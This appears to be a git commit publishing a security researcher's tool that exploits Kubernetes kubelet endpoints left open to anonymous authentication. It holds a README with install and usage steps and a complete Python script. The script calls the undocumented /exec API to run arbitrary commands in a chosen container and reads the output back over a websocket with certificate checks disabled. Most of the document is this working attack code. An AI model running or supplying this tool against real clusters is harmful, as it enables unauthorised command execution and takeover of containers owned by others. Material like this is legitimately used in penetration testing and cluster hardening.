0c5e678aa3f5149213e7e0b0ada726d366a0b385
Alexandre Kaskasoli <alexandre.kaskasoli@mwrinfosecurity.com>
2019-01-09 19:58:59 +0000

    initial commit

---
+++ README.md
@@ -0,0 +1,58 @@
+# Kubelet Anonymous RCE
+
+>Executes commands on a kubelet endpoint that allows anonymous authentication (default)
+
+## Why?
+
+By default `kubelet` allows anonymous authentication:
+
+```
+--anonymous-auth
+	Enables anonymous requests to the Kubelet server. Requests that are not rejected by another authentication method are treated as anonymous requests. Anonymous requests have a username of system:anonymous, and a group name of system:unauthenticated. (default true)
+```
+
+The `kubelet` API is not documented but the [code](https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/server/server.go) is straightforward.
+
+There is a `/exec` endpoint which allows running a command in a target container and returns a link to fetch the output.
+
+The link is a stream that should be read with a websocket.
+
+This script handles it all easily.
+
+## Install
+
+```
+$ git clone https://github.com/serain/kubelet-anon-exec.git
+$ cd kubelet-anon-exec
+$ pip3 install -r requirements.txt
+```
+
+## Example
+
+This command runs `ls /tmp` in the `tiller` container and returns the output:
+
+```
+$ python3 kubelet-anon-rce.py --node 10.1.2.3 --namespace kube-system --pod tiller-797d1b1234-gb6qt --container tiller --exec "ls /tmp"
+```
+
+## Usage 
+
+```
+$ python kubelet-anon-exec.py --help
+usage: kubelet-anon-exec.py [-h] [--port PORT] -t TARGET -n NAMESPACE -p POD
+                            -c CONTAINER -x EXEC
+
+Run commands against a Kubelet endpoint.
+
+optional arguments:
+  -h, --help            show this help message and exit
+  --port PORT           endpoint port, default: 10250
+  -t TARGET, --target TARGET
+                        Kubernetes node IP address
+  -n NAMESPACE, --namespace NAMESPACE
+                        namespace, ie: 'default'
+  -p POD, --pod POD     pod name, ie: 'dh-nginx-8484b69674-z9tzl'
+  -c CONTAINER, --container CONTAINER
+                        container name, ie:'nginx'
+  -x EXEC, --exec EXEC  command to execute, ie: 'ls /tmp'
+```
---
+++ kubelet-anon-rce.py
@@ -0,0 +1,78 @@
+import asyncio
+import argparse
+import requests
+from websocket import create_connection
+import urllib3
+import ssl
+from urllib.parse import urljoin
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+
+BASE_URL = 'https://{target}:{port}/'
+EXEC_PATH = '/exec/{namespace}/{pod}/{container}'
+READ_URL = 'wss://{target}:{port}/'
+PARAMS = {
+    'input': 1,
+    'output': 1,
+    'tty': 1
+}
+
+
+def get_args():
+    parser = argparse.ArgumentParser(
+        description='Run commands against a Kubelet endpoint.')
+    parser.add_argument('--port', default=10250,
+                        help='kubelet port, default: 10250')
+    parser.add_argument('-t', '--target', required=True,
+                        help='Kubernetes worker node IP address')
+    parser.add_argument('-n', '--namespace', required=True,
+                        help='namespace, ie: \'default\'')
+    parser.add_argument('-p', '--pod', required=True,
+                        help='pod name, ie: \'dh-nginx-8484b69674-z9tzl\'')
+    parser.add_argument('-c', '--container', required=True,
+                        help='container name, ie:\'nginx\'')
+    parser.add_argument('-x', '--exec', required=True,
+                        help='command to execute, ie: \'ls /tmp\'')
+    
+    return parser.parse_args()
+
+
+def exec(target, port, namespace, pod, container, command):
+    """
+       Runs a command in the given container and returns the path to poll for
+       results.
+    """
+    path = EXEC_PATH.format(port=port,
+                            namespace=namespace,
+                            pod=pod,
+                            container=container)
+    url = urljoin(BASE_URL.format(target=target, port=port), path)
+    params = {**PARAMS, 'command': command.split()}
+    response = requests.get(url, params=params, verify=False,
+                            allow_redirects=False)
+    return response.headers['location']
+
+
+def read(target, port, path):
+    url = urljoin(READ_URL.format(target=target, port=port), path)
+    ws = create_connection(url, sslopt={'cert_reqs': ssl.CERT_NONE})
+    output = ''
+    while True:
+        try:
+            output += ws.recv().decode('utf-8')
+        except:
+            ws.close()
+            break
+    return output
+
+
+def main():
+    args = get_args()
+    cri =  exec(args.target, args.port, args.namespace, args.pod, args.container,
+                args.exec)
+    output = read(args.target, args.port, cri)
+    print(output)
+
+
+if __name__ == '__main__':
+    main()
